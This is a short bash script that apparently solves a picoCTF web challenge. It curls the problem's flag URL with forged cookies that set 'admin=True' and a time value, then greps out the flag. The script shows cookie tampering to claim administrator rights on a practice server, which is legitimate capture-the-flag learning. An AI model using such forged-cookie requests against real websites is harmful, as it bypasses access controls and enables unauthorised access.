#!/bin/bash

curl "https://jupiter.challenges.picoctf.org/problem/25189/flag" -H "Cookie: time=1400; admin=True;" -s | grep -oE picoCTF{.*} --color=none
